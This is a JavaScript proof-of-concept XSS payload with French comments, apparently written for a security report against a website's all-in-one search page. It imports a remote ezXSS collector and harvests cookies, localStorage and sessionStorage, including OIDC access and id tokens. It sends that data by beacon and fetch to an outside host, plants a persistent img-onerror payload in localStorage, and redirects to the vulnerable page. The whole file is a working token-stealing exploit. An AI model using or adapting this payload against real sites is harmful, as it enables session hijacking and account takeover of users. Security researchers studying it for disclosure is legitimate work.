(function () {
    'use strict';

    // ===================== CONFIG — édite selon ton infra =====================
    var OOB   = 'https://o.g6g.fr/'+document.domain; // Collaborator/OOB : reçoit le POST
    var EXTRACTOR = 'https://poc.g6g.fr/extractor.js';              // ezXSS collector un import de la recupere toutes els infos de la page : impression ecran + localstorage + cookies + session storage + DOM
    // =========================================================================

    function dumpStore(s) {            // sérialise un Storage complet en objet {clé: valeur}
        var o = {};
        try { for (var i = 0; i < s.length; i++) { var k = s.key(i); o[k] = s.getItem(k); } } catch (e) {}
        return o;
    }
    // EZXSS
    import(EXTRACTOR);
    // -------- 1) PoC visuel : ce fichier est SOUS TON CONTRÔLE → 'alert' n'est PAS filtré ici --------
    try { alert(`Voila la preuve d'exec JS sur ${document.domain} . SI la victime a un compte et une session inactive je peux recuperer l'oidc ici. \n Si la victime n'a pas encore de compte un attaquant peut polluer le localstorage pour provoquer une exec a chaque fois qu'il ira sur /recherche-tout-en-un \n Dans ce POC je vais vous redirigez directement sur /recherche-tout-en-un pour constater l'exec JS a partir de la valeur injecter dans le localstorage ici `); } catch (e) {}


    // -------- 2) Collecte : sessionStorage contient les tokens OIDC (oidc.user:* = id_token / access_token) --------
    var loot = {
        run:            RUN,
        url:            location.href,
        domain:         document.domain,
        cookies:        document.cookie,        // non-HttpOnly seulement (dwsid est HttpOnly → absent, normal)
        sessionStorage: dumpStore(sessionStorage),
        localStorage:   dumpStore(localStorage),
        ua:             navigator.userAgent,
        ts:             Date.now()
    };
    var body = JSON.stringify(loot);

    // -------- 3) Exfil vers  OOB en POST : sendBeacon (survit à la navigation) + fetch fallback --------
    try { navigator.sendBeacon(OOB, body); } catch (e) {}
    try {
        fetch(OOB, {
            method: 'POST',
            mode: 'no-cors',
            keepalive: true,      // survit au unload/redirect
            headers: { 'Content-Type': 'text/plain' },
            body: body
        });
    } catch (e) {}

    // -------- 4) GET ezXSS => exfill localstorage / session storage / cookies / DOM etc...  --------

    try {
        var msPayload =   `"><img src=//o.g6g.fr/pingSrcFromMultiSearch onerror="alert(\'2eme_exec_js_ici_grace_au_local_storage_pollution sur ${document.domain} + exec ezxss\');import(EXTRACTOR);">`;
        localStorage.setItem('multiSearchTerms', JSON.stringify([msPayload]));
    } catch (e) {}

    // -------- 6) Navigation vers la page-sink pour que W() rende le terme seedé au load --------
    //   Délai court pour laisser partir le beacon/fetch avant l'unload.
    setTimeout(function () {
        try { location.assign('/recherche-tout-en-un?serverOut=OOB'); }
        catch (e) { location.href = '/recherche-tout-en-un?serverOut=OOB'; }
    }, 1200);
})();